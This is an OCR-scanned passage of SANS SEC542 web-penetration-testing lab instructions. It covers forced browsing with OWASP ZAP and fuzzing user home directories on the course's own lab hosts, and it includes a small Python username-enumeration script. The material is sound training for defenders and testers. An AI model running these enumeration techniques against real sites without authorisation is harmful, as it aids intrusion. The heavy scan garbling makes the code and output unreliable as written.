'---' 
2 
'--' 
'-..../ 
\_,, 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
~ 
Surf to http:// cust42. sec542. com 
Note: Recall we discovered this name during the DNS brute force exercise. 
Press CTRL-U to view the HTML source code. 
,,•DOCl"Y."I: M·d:. 
<lltm1 \ang=·en"> 
<head> 
</bud> 
<boll)'> 
<div sty\.,.•height: 25epx"> 
<illlg 1rc;.•~· att,.• • atyt.-"width: 100%# /> 
</div> 
</body> 
</htlll> 
,,--__ 
Simplistic source code ... There is a single image link and not much else. This is a minimalist, yet awesome, 
~ 
web page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
3 
cust42.sec542.com 
Zap• -I, 
ft 
>> 
·= - 
[challenge: No Hints 
Perform the following tasks: 
• 
Use ZAP's Forced Browse to discover unlinked URLs at https: / / cust42. sec542. com 
• 
Discover at least two new URLs using ZAP 
• 
Browse any discovered URLs in Firefox; these will be explored further in future labs 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
\.....I 
'-' 
__, 
'-' 
'-' 
'-' 
'-' 
'-' 
,,___,. 
'-' 
__, 
'-' 
'-' 
\.....I 
\.....I 
'-' 
'-" 
'-" 
\.....I 
'-' 
'-../ 
'---' 
\.....I 
'-" 
'-" 
'---' 
'-' 
'-" 
'-" 
__, 
'---' 
'---' 
'-" 
'-.../ 
__, 
\.....I 
4 
'-' 
'---' 
'--' 
!step-by-Step Instructions 
Begin the Forced Browse 
In ZAP, right-click on http:// cust42. sec542. com from either the Sites pane or from the History 
tab. 
ilJ Default Context 
'!' G Sites 
GET http:/ /cust42, sec 542. com/Expedition -42. jpg HTTP/1. 1 
User-Agent: Mozilla/5.0 {Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/50,0 
Accept: • /* 
Accept-Language: en-US,en;q=0.5 
Referer: http: //cust42, sec 542. com/ 
Search ~ Alerts 
@ U; "f Filter: OFF f Export 
Id 
Req. Timestamp 
Met... J URL 
Co .. , I Reason 
Size Resp .... i Highest ... 
N ... I Tags 
1 1/19/18 8:48:5 ... GET 
http://cust42.sec542.com/ 
200 
OK 
170 bytes 
i-'-i Medium 
Choose Attack, and then choose Force Browse site: 
Run application 
Exclude from Context 
Open/Resend with Request Editor ... 
Exclude from 
Open URL in Browser 
Show :n Hrstory Tab 
Open URL in System Browser 
irec ory 
Forced Browse directory (and children) 
~ AJAX Spider ... 
Fuzz ... 
"" "--------------------' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
5 
ZAP should begin the forced browse attack immediately: 
\_,I 
' 
.;'C.J>. 
- 
- 
~ 
'---' 
Forced Browse if' )l 
Req. Timestamp 
jHesp, Tlmestamp I Meth ... I URL 
I Co ... I Reason 
I Size Resp, Hea .... j Size Resp .. 8 ... 
1/19/18 9: 12: 53... 
1/19/18 9: 12: 53... 
GET 
http:/lcust42. sec542. com: 80/cgi-bin/ 
1/19/18 9:12:53 ... 
1/19/18 9:12:53 ... 
GET 
http:J/cust42.sec542.com:80/ 
1/19/18 9:12:58,,, 
1/19/18 9:12:58 ... 
GET 
http:!/cust42. sec 542. com: SO/icons/ 
403 Forbidd... 
160 bytes 
292 bytes 
200 OK 
250 bytes 
170 bytes 
403 Forbidd... 
160 bytes 
290 bytes 
Forced browsing involves MANY requests and will take as much time as you allow it. 
SEC542-© 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
'---' 
'---"' 
'---"' 
'---"' 
'--../ 
'---"' 
'---' 
'---' 
'---' 
'---' 
'---"' 
'-....., 
''----' 
'---' 
'-' 
'---' 
'-.J 
'---' 
\_,I 
'---' 
'---' 
'-" 
'---' 
'---' 
'---' 
'--../ 
'---' 
'--../ 
'--../ 
'-" 
6 
·- 
'--../ 
.,.___,, 
ZAP Forced Browse Results 
Let ZAP browse until the scan is complete, as indicated by Current Scans showing 0. 
Current scans.o Num Rieque!lts:219353 
j Size Resp. Header I Size Resp. Body I@ 
1119/18 9:12:53 PM 
1/19/18 9:12:53 PM 
GET 
http://cust42.sec542.com:80/ 
1/19/18 9:12:53 PM 
1/19/18 9:12:53 PM 
GET 
http:!/cust42.sec542.com,80/cgl-bin/ 
1/19/18 9:12:58 PM 1/19/18 9:12:58 PM 
GET 
http:/lcust42.sec542.com:80/icons/ 
1/19/18 9:13:27 PM 
1/19/18 9:13:27 PM 
GET 
http:/lcust42.sec542.com:80/mwiki/ 
1/19/18 9:13:28 PM 
1/19/18 9:13:28 PM 
GET 
http://cust42. sec542. com: BO/server-status/ 
250 bytes 
170 bytes 
: .. {\ 
403 Forbidden 
160 bytes 
292 bytes 
f! 
403 Forbidden 
1150 bytes 
290 bytes 
i 
1 
301 Moved P... 
4151 bytes 
O bytes 
( 
200 
OK 
183 bytes 
O bytes 
i 
,----., 
The forced browse should discover four new possible locations to explore: 
r ¥ Q<,1(1:: start r .. Request J Rs&pontl&ti- r+J 
========== 
[ Header~ 
[ Body, TeJd ! j e ~ 
HTTP /1 . 1 200 OK 
Date: Sat, 20 Jan 2018 05:12:53 GMT 
Server: 
Apache/2. 4. 7 (Ubuntu) 
Last-Modified: Thu, 12 Nov 2015 18:52:15 Gl•IT 
ETag: "aa-5245c7109c824" 
r..;l-~Oo.n,~-- 
• 
< DOCTYPE htm 1 > 
<html lacg~"en"> 
<head~ 
</head> 
<body> 
<div ';i:y"1.e:;:;:"fleight: 25Gpx"> 
J 
<img ,,rc="Expeditlon-42. jpq" alt-:' 
stfle="width, 100%" /> 
l 
</div:,. 
- 
~-------------~ lsib.orl:v..>-~---------------------------~"' 
}, Forced f:!Nlwse J/t ·;,; 
Current scans.o] Num Reque5t11:2I9353 
~ 
1/19/18 9:12: 
1!19/18 
GET 
GET 
GET 
1/19/18 9:13:27 PM 
1119/18 9:13: 
GET 
1119/18 9:13:28 PM 
1/19/18 9:13:28 PM 
GET 
Code I Reason 
! Size Resp. Header I Size Resp. Body lt3 
htt :/fcust42.sec542.com:80/ 
200 OK 
250 bytes 
170 bytes 
• 
l'h~tt~p,,.:/~/G-Us""i't~42~.-
Se-C':!!'54~2~. C-0-m"'.!
: 8~0~/c-gi""i'-b-in~{---~~~l""'l''l"""'""lll60 bytes 
292 bytes 
r 
http:/fcust42.sec542.com:80/icons/ 
160 bytes 
290 bytes 
I••.• 
http:l{cust42.sec542.com:80/mwikil 
461 bytes 
O bytes 
http://cust42.sec542.com:80/server-status/ 
183 bytes 
O bytes 
403 Forbidd 
403 Forbidden 
301 
Moved P ... 
200 
OK 
Note: Not all of these will develop into something interesting. Forced Browse highlights these entries 
simply because they did not match the expected response for file not found for this application. 
Here is a zoomed-in version of the results: 
' Code 
Reason 
GET 
GET 
GET 
GET 
GET 
http:l/cust42.sec542.com:80/ 
http:l/cust:42. sec 542. com:80/cg,i-bin/ 
http:l/cust42. sec 542. com: 80/icons/ 
http://cust42.sec542.com:80/mwlki/ 
http:l/cust42.sec542.com:80/server·status/ 
200 OK 
403 Forbidden 
403 Forbidden 
301 Moved Permanently 
200 OK 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
7 
Two entries immediately look interesting and possibly accessible: 
http://cust42.sec542.com:80/mwiki 
http://cust42.sec542.com:80/server-status 
While /cgi-bin and /icons could prove interesting, their response code HTTP 403: Forbidden suggests that, at 
present at least, we are not being given immediate access. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
\_/ 
'---" 
'---" 
'---" 
'---" 
'---" 
\__, 
'--' 
·.____, 
'--' 
'-.__,I 
'---" 
'---" 
'--' 
'-" 
'-.__,I 
'--' 
'---" 
'---" 
'--' 
'--' 
'---" 
'-" 
'--' 
'--' 
'--' 
'-" 
'-../ 
'---" 
'-.__,I 
'-../ 
'---" 
\__, 
'-.__,I 
'-../ 
'-../ 
'-../ 
'-.J 
'-.J 
8 
'-.J 
'-.__,I 
'--' 
View the Newly Discovered URLs 
Right-Click http:// cust42. sec542. com: 80/ server-status 
Choose 'Open URL in System Browser' 
GET 
liJ.9/18 9:12:58 PM 
1/19/18 9:12:58 PM 
GET 
1!19Jl8 9:B:27 PM 
1/19/18 9:13:27 PM 
GET 
Note: The 'Open URL in System Browser' should work, but 'Open URL in Browser'-> 'Firefox' will not 
(same is true for Chrome), due to a Java issue. If, however, neither approach is successful, then simply 
copy the URL and paste it into Firefox's address bar. 
Apache Server Status for 
cu.st42.sec542.com (via 192.168.1.8) 
Server Version: Apache/2.4.7 (Uburrtu) PHP/5.5.9-1uhuntu4.20 OpenSSL/1 .. 0.lf 
Server lv1PM: prefork 
Server Built.jul 15 201615:32:47 
Current Time: Friday, 19-Jan-2018 21:31:16 PST 
Restart Time: Thursday, 18-Jan-2018 12:37:52 PST 
Parent Server Config. Generation: 1 
Parent Server MPM Generation: 0 
Server uptime: 1 day 8 hours 53 minutes 23 seconds 
Server load: 0.36 0.43 1.22 
Total accesses: 222981 - Total Traffic: 62. 7 MB 
CPU Usage: u15.99 sl0.42 cuu cso- .0223% CPU load 
1.88 requests/sec - 555 B/second - 295 B/:request 
5 requests currently being processed, 5 idle workers 
,..--, 
Apache Server Status is probably not a business-necessary feature for this site. 
,..--, 
Now, repeat the process for http:// cus t4 2 . sec54 2 . com: 8 0 /mwiki 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
9 
1/19/18 9:12:53 PM 
1/19/18 9:12:53 PM 
1(19!18 9:12:53 PM 
1/19/18 9:12:58 PM 
1/19/18 9:12:58 PM 
GET 
1/19!18 9:.13:28 PM 
1/19/18 9:13:28 PM 
GET 
Here is http:// cust42. sec542. com: 80/mwiki. Note that it is a MediaWiki site, and there have 
been a number of recent MediaWiki security vulnerabilities. We will revisit the vulnerability on day 5. 
Main page 
Recent 
Random page 
Tools: 
',tJhat !mks here 
Related d,anges 
pag~ 
Printab!e version 
Permaru,nt !ink 
Page information 
Page 
Include tn Context 
Run application 
Exclude from ccntext 
Request Editor,,. 
Exclude from 
~§ijn Pag.~ 
ReM Et'.lit V!ew history 
MedJaWUd has been successfully lntJtalled. 
Consu!t the 
Guide@ for information on using the w!kl software. 
~etting sta~E:9 
Tills pa<,1e was last modified on 13 November 2015, at 08:45, 
nas been 
a 
PrlViiiCY poltcy About Expedition 42 Oi5((almers 
[edit] 
'-" 
'-_,I 
----- -----"-~~----'<--'-'--"~ ~ 
• 
• MedittWlki PAO@ 
,. 
# 
!dflnL,ttUP@ 
Final Step 
Be sure to disable the ZAP proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
'-J 
'----'. 
'-_,I 
'----' 
'-'' 
'-J 
'---' 
'-../ 
'-" 
'----' 
'----' 
'----' 
'----' 
'-" 
'-../ 
'----' 
'-J 
'----' 
'-' 
'----' 
'-J 
'-J 
'-' 
'---' 
'-" 
''--" 
'---' 
'-' 
'--' 
'-J 
'-" 
'---' 
'---' 
'--' 
'--' 
'-J 
10 
v 
'----' 
'--" 
,r """---~-~~==~~~~~ 
~) (D : www,sec542.org 
~Exercises..- f Mutlllldae 
SANS Security 542 - Web p. 
I 
Ethical Hae 
B 
HTIP Rec . ests and Res o 
Heartbleed 
Snake 
Shellshock -_~etstat.cgi 
Auto-detect 
system 
Burp 
Rat Proxy 
Zap 
Web Authentication - Basic 
Web Authentication - Digest ·-=-'irmf•,n,,, __ 
, __ ,.,_,,.,Ti 
Ensure No Proxy is set when complete. 
N.o Pro 
!credits 
We would like to thank NASA for the excellent source of images and related information. This image comes 
from NASA's Hitchhiker's Guide to the Galaxy-Themed Expedition 42, to the International Space Station. 
More information is available at http://www.nasa.gov/mission_pages/station/expeditions/expedition42/ 
(https://cyber.gd/542_243). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.4: ZAP Forced Browse 
11 
,-._ 
I Objectives 
• 
• 
• 
• 
Discover browsable directories that show a file listing 
Understand how to identify locations that allow directory browsing 
Begin working with ZAP's fuzzing capabilities 
Leverage a simple Python script for fuzzing user1ames 
Some web servers that host user-controlled content map www.example.com/ -username to 
/home/username/public_html/ 
For example: www. sec542. org/-adent maps to /home/ adent/public_html/ on the local disk. 
Apache supports this functionality via the UserDir directive {not enabled by default): 
On systems with multiple users, each user can be permitted to have a web site in their home directory 
using the UserDir directive. Visitors to a URL http://example.com/~username/ will get content out of 
the home directory of the user "username", out of the subdirectory specified by the UserDir directive. 
Note that, by default, access to these directories is not enabled. You can enable access when using 
UserDir by uncommenting the line 
#Include conf/extra/httpd-userdir.conf 
in the default con fig file conf/httpd.conf, and adapting the httpd-userdir.conf file as necessary, or by 
including the appropriate directives in a Directory block within the main con fig file. 1 
Reference: 
[1] https://httpd.apache.org/docs/trunk/howto/public_html.html (https://cyber.gd/542_313) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
1 
[Lab Setup 
This exercise will use the Python script "find _accounts", written by SEC542 instructor Adrien de 
Beaupre (@adriendb). 
The script automates the process of discovering web-accessible directories such as 
"www. sec542. org/-adent". It requires a list of last names (surnames) as input and fuzzes the 
website by appending a-z to each entry, surfing the respective page, and printing those that return an 
HTTP 200 response code. 
You may view the find_ accounts Python code by typing: 
$ gedit /usr/local/bin/find_accounts 
~! /us
0
~/b:i~/python 
import sys, os, urllih2, string 
filetoread = sys.argv[l] 
infile = open(filetoread, 'r') 
for line in infile: 
for initial in string.ascii lowercase: 
myurl "" "http://Wvi\•/sec542.org/-" + initial + line 
try: 
myresponse"" urllib2.urlopen(myurl) 
print "Found:", initial+ line.strip{},":" ,"("+myurl.strip()+")'' 
except urllib2.HITTPError, e: 
pass 
Note: The code on the Security542 VM is more fully commented. 
Create a file containing common American/English last names (surnames), and include a few last names 
from the Hitchhiker's Guide to the Galaxy for good measure. 
Type the following in a Sec542 Linux VM terminal: 
$ gedit -/lastnames 
v~ 
Note that the tilde character I"?") maps the referenced user's home directory, so ~11astnames matches 
/home/student/lastnames. The tilde I'":"] character is above the backtick character on a U.S. keyboard, 
usually one key below <Esc> (the Escape key). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
...._,, 
...._,, 
...._,, 
...._,, 
'-../ 
...._,, 
'-../ 
'-../ 
'-../ 
'--' 
'-' 
...._,, 
'--' 
...._,, 
'--'. 
'-' 
'--' 
'--' 
'-../ 
'--' 
'-' 
'-' 
'--' 
...._,, 
'--' 
'-../ 
'--' 
'--' 
'--' 
'-../ 
'-../ 
\.._; 
'-../ 
'--' 
'-../ 
'--' 
'--' 
'--' 
'-' 
2 
\.._; 
'--' 
'--' 
Add the following names to the ~;1astnames file: 
• 
beeblebrox 
• 
dent 
• 
prefect 
• 
jones 
• 
smith 
Please use these names: If you freestyle here, you may miss some results. Also, note that Ford Prefect's 
last name is 'prefect', not 'perfect'. 
I beeb Leb rox 
dent 
[pr-ef'ect 
'j ones! 
smith 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
3 
!challenge: No Hints 
'---" 
'---" 
Target Format: http://www. sec542. org/- [a-z] lastname 
Example Target: http://www. sec542. org/-adent 
'--" 
'-.../ 
'--../ 
Perform the following tasks: 
'---" 
• 
Generate a list of common last names (aka surnames or family names) and save to a file lastnames. 
Note: Be sure to include surnames found in the Hitchhiker's Guide to the Galaxy (see lab setup for 
suggestions). 
• 
Use the find_ accounts script with the lastnames file created previously to fuzz user directories 
• 
Inspect the results identified by the script 
• 
Use ZAP's fuzzer to replicate the find_ accounts functionality: 
'---" 
'--../ 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
'-.../ 
'-.../ 
'-.../ 
'--../ 
'--../ 
'---' 
'-" 
'----' 
'--../ 
'----' 
'-.../ 
''----' 
'--../ 
'-' 
'--../ 
'--../ 
'--../ 
'--../ 
'---" 
'--../ 
'--../ 
'---' 
'-.../ 
'----' 
'---' 
'-.../ 
'----' 
'----' 
'---' 
'----' 
4 
'-.../ 
'---' 
'-.../ 
Step-by-Step lnstructio 
Run find accounts 
We start with the easy part and leverage Adrien's find_accounts script to perform the heavy lifting for 
us. 
Warning: Details for creating the lastnames file are found in the lab setup. 
Run the following command, and verify your results match those listed here: 
Found: zbeeblebrox : 
(http://www.sec542.org/-zbeeblebrox) 
Found: adent 
: 
(http://www.sec542.org/-adent) 
Found: fprefect 
(http://www.sec542.org/-fprefect) 
Found: hjones 
(http://www.sec542.org/-hjones) 
Found: lsmi th : 
(http://www. sec542. org/-lsmi th) 
Warning: Your output should exactly match the output shown. If not, check the contents of the 
-/lastnames file, and verify it matches the required content. 
[-]$ find_accounts -/lastnames 
Found: zbeeblebrox : 
(http://www.sec542.org/-zbeeblebrox) 
Found: adent : 
{http:/ /Wl.vw .. sec542. org/-adent) 
Found: fprefect : 
(http://www.sec542.org/-fprefect) 
Found: 
ones 
(http:/ /WVJW. sec542. org/-hj ones) 
Found: lsmi th : 
(http:/ /\!i'W\'J. sec542. o rg/ - lsmi th) 
[-]!$ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
5 
Launch ZAP 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
'---' 
'---' 
'-..../ 
'---' 
..___, 
..___, 
'---' 
'-' 
'---' 
'---' 
..___, 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
,.. 
CWASPZA? 
on port loca!hosbSOSl 
In this case, close the additional ZAP instances, leaving the original. When in doubt, close all ZAP instances 
and start over. ZAP must be listening on port 8081 for this lab to work. 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
'-..../ 
'-..../ 
'-' 
'---' 
'-' 
'-..../ 
'---' 
'---' 
'---' 
'-..../ 
'-..../ 
'-' 
'-..../ 
'-.../ 
'-../ 
'-../ 
'--' 
'-' 
'-..../ 
'-../ 
'--' 
'-../ 
'---' 
'-...., 
, __ ,, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
6 
'-../ 
'-' 
'-../ 
Configure Firefox to use the running proxy: 
,......__ 
In Firefox, select ZAP from the Proxy Selector drop-down: 
Ensure ZAP is now chosen as the proxy. 
We have already installed a Firefox extension called Proxy Selector. This enables you to quickly switch 
Firefox between various proxy servers. In this case, we have already configured proxy settings and saved 
them under the name ZAP. To activate the use of ZAP, simply select ZAP from the proxy list on the right 
side of the proxy bar at the top of the Firefox window. 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
7 
Surf to www.sec542.org/"'adent/ 
In Firefox, enter http://www. sec542. org/-adent/ in the address bar and surf to the site. 
Index of /-adent 
Name 
Last modified Size Description 
~ Parent Directory 
important .. txt 
2015,01~04 14:22 591 
~! passwords.txt 
2015"01~04 14:23 
53 
[fl phpinfo .. php 
201~01,04 14:22 
20 
Apache/2 .. 4 .. 7 (Ubuntu) Server at www.sec542.org Port BO 
Then switch to ZAP and view the History pane: 
" 
Default Context 
" .. 
http:Jtwww. sec 542. org 
Welcome to the OWASP Zed Atta 
ZAP is an easy to use ,ntertraterl penetration tESting too! for finding 
Please be aware. that you should 
attack applcatrons that you 
To quickly test an application, enter its URL betow and press 'At.tad(. 
Reas.,. 
2... OK 
.,. 
1,353 by... 
r,!i· MedL .. 
Note: History is the default view; it should appear by default. If It doesn't, click the History tab. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
______. 
'--" 
'--" 
'-,_/ 
'-J 
'-./ 
'-..../ 
'-./ 
'-..../ 
'-..../ 
'-J 
'-/ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-./ 
'-./ 
'-..../ 
'-./ 
'-./ 
'-' 
.___, 
.___, 
'-..../ 
'-..../ 
'-..../ 
'-./ 
'-./ 
'-" 
'--" 
\,_., 
''-" 
'-..../ 
'-" 
'-' 
'-' 
'-J 
8 
'-' 
'-./ 
'-/ 
Fuzzing in ZAP 
In ZAP, right-click http://www. sec542. org/-adent/ in the Sites pane. 
Select Attack. 
Then click Fuzz ... : 
"'D Contexts 
rlJ Default Context 
,. 8 Sites 
HTTP/1.1 200 OK 
Date: Sat, 20 Jan 2018 06:18:44 GMT 
Server: Apache/2. 4. 7 (Ubuntu) 
CU e 
Flag as Context 
Run application 
Exclude from Context 
Open/Resend with Request Editor ... 
Exdude from 
Open URL in Browser 
.w s 'd 
''<"'7 p1 er ... 
~ Active Scan ... 
}" Forced Srnwse site 
/' Forced Eirnwse directory 
)5, Forced Browse directory {and children) 
;fl,JAX Spider ... 
" 
ZAP's Fuzzer menu will appear: 
!GET http://',,w.secS42.or9/-.1dent/ tITT?/1.l 
;user-Ag!!nt: Mozilla/$.0 (XU; Linux i600; rv:50.0l Gecko/20100101 
!Fi "foJ/50. 0 
: i \Accept: text/ht• l. app l icatiootxMal+H l, application/~• l; q-e, SI, "f*; q•O. a 
: l;Accept-Llln,;iuag1: •n-US.en;q•G.5 
1 'iCQnnection, lcup-ali11e 
i ·t'-"gr1de-Insecu,-.-P.equtst11: 1 
, ''.li:lst, \(fl',sec542.org 
I 
I 
i ·r; 
lit 
I 
I 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
9 
Fuzz the First Initial 
In the ZAP Fuzzer menu, highlight the "a" in "adent". 
Note: Be sure to highlight a single character only; we will use this position to fuzz the first initial. 
Click Add. 
Options I Message Processors 
[Header: Text t'"'l [ Body: Text r•l 
GET http://ww.sec542.org/~dent/ HTTP/1.1 
User-Agent: MoziHa/5.0 (Xll...,J.j,n_ux i686; rv:5O.O) Gecko/2O1O01O1 
Firefox/5O.O 
Accept: text/html.application 
Accept-Language: en-US,en;q=O.5 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Host: 'tfw'vt.sec542.org 
Click Add again on the next Payloads screen: 
A ti I 
I• 
,. 
PaJloads 
+ X 
Location: Header (27, 28] 
Fuzz Locatfons: 
Prores~r:rrs . ., 
without confirmation 
I Cancel ] 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-" 
'-' 
'-' 
'-' 
'-' 
'---' 
·..__,, 
'-' 
'-" 
'-' 
'-' 
'-' 
'-....,/ 
'-' 
'---' 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
'---' 
'---' 
v 
'-" 
'-" 
'-" 
'---' 
'-' 
'-' 
10 
'J 
'-.../ 
'-' 
Add the Payload 
In the ZAP Add Payload menu, click the Type dropdown and select File Fuzzers: 
Regex (*Experimental*) 
Script 
Strings 
Then, select: 
~ 
jbrofuzz (triangle not checkbox) -> Alphabets (triangle)-> English Alphabet (checkbox): 
.. 
Type: (File Funers 
Files: 
..- @JJbrofuzz 
T !t]Alphabets 
OASCII 85 Alphabet 
OASCII 94 Alphabet 
OASCII 95 Alphabet 
OAlpha Numeric 
Osase32 (Extended HEX) Alphabet 
OBase32 Alphabet 
Osase64 (URUFile Safe) Alphabet 
OBase64 Alphabet 
Base 
lie· OBiology 
• OBuffer Overflows 
,. OExploits 
,. 
Format String Errors 
We specify clicking the triangle expansion icon next to jbrofuzz because clicking the check box next to 
jbrofuzz selects every jbrofuzz payload. We want only one in this case. The same is true for Alphabets; we 
r"'\ 
only want one: English Alphabet. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
11 
Click Add: 
3: C 
4: d 
5: e 
6: f 
7: g 
8: h 
9: j 
10: j 
Click OK on the Payloads screen: 
+ 
l( 
of Processors 
1 
File Fuzz... 
English A... 
O 
1'4' 
conftrmatlon 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
'._/ 
'--' 
'--' 
\,.,..I 
'-J 
'-.J 
'-.J 
'-J 
'-../ 
'-../ 
'-J 
'-J 
'-J 
'-J 
'-' 
'-J 
'-J 
'-J 
'-../ 
'-J 
'-' 
'-.J 
'-J 
'-../ 
'-.J 
'-' 
'-' 
'-J 
'-../ 
'-J 
''-../ 
'-J 
'-J 
'-J 
\_/ 
'-J 
'---./ 
\_/ 
.'-J 
\_/ 
12 
'-J 
'-J 
'---./ 
Fuzz the Last Name 
In the ZAP Fuzzer menu, highlight the "dent" in "adent". 
Click Add: 
Fwza, 
i Header: Text 
GET http://'N'W.Sec542.org/--l[eiifV HTTP/1.1 
User-Aqent: MoziHa/5.O CXl 
inux i686; rv:5O.0} Gecko/20100101 
Firefox/SO. 0 
_ 
_ 
j 
Accept: text zhtnl , app l i cat · 
tm1+xml, app Li cat inn/xal : q=O. 9, */*; q=O. 8: 
'; Accept-Language: en-US,en;q= 
I 
"I Connection: keep- a 1i ve 
i Upgrade-Insecure-Requests: 1 
· 
Host: ww.sec542.org 
Add ... 
X 
Remove 
Payloads .... 
Processors ... 
Remove without corstrmatton 
: 
-~ I 
!._:,_.. 
Cancel JI Reset Jl Start Fuzzer j 
,-, 
Click Add again on the next Payloads screen: 
PaJludl 
Location: Header [28, 32J 
Value: dent 
Payloads: 
# 
•; Type 
Description I # of Processors :!:9 
i-,.~' 
" . 
r 
"(lj Remov8 without confirmation 
f.. Cancel j 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
13 
Add the Payload 
In the ZAP Add Payload menu, select Type: File. 
File Fuzzers 
Numberzz 
Regex (*Experimental*) 
Script 
Strings 
Multiline: 
Save ... 
Cancel 
Then, click Select ... 
,,,. 
Add 
+ X 
T'.tipe: 
· File __________________________ _, 
File: 
,_,,~,= 
Character Encoding: I UTF-8 
'-------------------------' 
Limit: 
Value: 
CommentToken: 
# 
Ignore Empty Lines: 
Ignore First Line: 
Payloads Preview: 
( Cancel J ( A~~ J 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
,.___.
,.___.
-
\.___, 
--....,
'----'
.____, 
'-'
.____, 
'--' 
'-.../ 
.____, 
.._,
'-.../ 
'----'
.____, 
.._, 
\..._
\..._, 
\..._,
\..._, 
'--"
.._, 
'--" 
\.___, 
'-J 
'--" 
'--" 
'----' 
'----' 
'----' 
'----' 
''----' 
'----' 
\.___, 
\.___, 
'----' 
·.____, 
\.___, 
14 
\..._, 
\.___, 
'----' 
Now navigate to /home/student/lastnames and then click Open: 
+ X 
Look ln; 
[ [jl student 
Music 
pdfs 
Pictures 
is Public 
[g public_html 
[ii Templates 
Iii Videos 
backdoors.txt 
[J core 
wordpress471.pcap 
Fi.lef:!ame: 
Jype: 
,.----._ 
Then, click Add. 
! F.ile 
File: 
Jhome/student/lastnames 
Character Encoding: [_u_T_F_-8 
..,_J 
Limit: 
Comment Token; 
· # 
Ignore Empty Lines: 
Ignore First Line: 
Payloads PrevJew: 
beeblebrox 
dent 
prefect 
[ones 
smith 
b::j Save,,, 
t cancel 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
15 
Then, click OK on the Payloads screen: 
T 
Payloads 
+ X 
Value: dent 
Payloads: 
# 
Description I # of Processors 
l File 
last names 
O 
(!1 Remove without confirmation 
__ lfor<J 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
'--' 
'---' 
'---' 
\.J 
'-../ 
'-../ 
\.J 
'---' 
'-....," 
'-" 
"-' 
'-../ 
'-../ 
'---' 
'-../
'-'' 
'---' 
'-../
'--' 
'-.../ 
'--' 
'-../ 
'-"' 
'-../ 
'---' 
'-../
'---' 
'--' 
'---' 
'--' 
'-../ 
\.J 
'---' 
'---'
'---' 
'-'
'-' 
16 
'-' 
'--' 
'---" 
Start the Fuzzer 
Next: Click Start Fuzzer: 
Fui:rar 
+ X 
GET http://'1fliw'.sec542.org/--laen / I-ITTP/1.1 
User-Agent: Mozilla/5.0 (Xll; Linux i686; 
rv:50.0) Gecko/20100101 Firefox/50.0 
Accept: text/html, app lication/xhtml+xml., 
·application/x1l;q=0.9,*/*;q=0.8 
'Accept-Language: en-US,en;q=0.5 
;Connection: keep-alive 
·i j Upgrade-Insecure-Requests: 1 
'Host: 
IY'W'tl.sec542.org 
a 
Ii] Remove without confirmation 
ZAP should make quick work of the job. 
[\ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
17 
Here is the default output, with some columns adjusted for readability: 
Untidi'!d Seuii:m -OWA~ »Jl 2.7.0 
j • 
Contexts 
Default Context 
., 8 Sites 
,. ~ Fl! http:f/W.W1.secS42.org 
Welcome to the OWASP Zed A.tta( 
' 
ZAP rs an easy to use integrated penetration testing, tool for finding 
Please be aware that you should only attack applications that you ha 
Rl.. 
Current 
Mess ... 
Size 
state 
ay!oads 
o Original 
200 OK 
5... 
227 bytes 
l Fuzzed 
404 Not Found 
